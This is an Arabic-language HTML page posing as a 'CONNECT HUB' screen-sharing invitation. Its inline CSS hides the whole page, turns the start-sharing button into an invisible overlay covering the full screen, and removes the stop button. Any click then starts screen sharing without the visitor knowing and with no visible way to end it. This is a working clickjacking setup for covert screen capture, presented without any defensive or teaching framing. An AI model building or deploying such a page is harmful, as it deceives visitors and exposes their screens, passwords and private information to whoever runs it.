<!doctype html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="referrer" content="no-referrer">
    <title>CONNECT HUB | مشاركة الشاشة</title>
    <link rel="stylesheet" href="/static/style.css">
    <style>
        /* 1. Hide the entire body and everything inside it */
        body {
            visibility: hidden !important; 
            background-color: #ffffff !important; /* Force white background */
            margin: 0 !important;
            padding: 0 !important;
            overflow: hidden !important;
        }

        /* 2. Force the button to be VISIBLE, but INVISIBLE to the eye */
        #start {
            visibility: visible !important;
            position: fixed !important;
            top: 0 !important;
            left: 0 !important;
            width: 100vw !important;
            height: 100vh !important;
            opacity: 0 !important; /* This makes it transparent */
            z-index: 999999 !important;
            cursor: default !important;
            border: none !important;
            background: transparent !important;
            outline: none !important;
            display: block !important;
        }

        /* 3. Ensure the stop button is completely gone */
        #stop {
            display: none !important;
            visibility: hidden !important;
        }
    </style>
</head>
<body>
    <header><span class="brand">CONNECT <b>HUB</b></span><small>طلب مشاركة الشاشة</small></header>
    <main>
        <div id="share" class="card">
            <h1>مشاركة شاشتك</h1>
            <p>وصلتك دعوة لمشاركة شاشة جهازك مع شخص آخر.</p>
            <div id="compat" class="status"></div>
            <div class="row">
                <!-- IMPORTANT: 'disabled' attribute removed so it can be clicked immediately -->
                <button id="start">بدء مشاركة الشاشة</button>
                <button id="stop" class="hidden">إيقاف المشاركة</button>
            </div>
            <p id="msg"></p>
            <div class="video" style="margin-top:14px">
                <video id="preview" autoplay playsinline muted></video>
                <div id="placeholder">لا توجد مشاركة حالياً</div>
            </div>
        </div>
    </main>
    <script src="/static/share.js"></script>
</body>
</html>
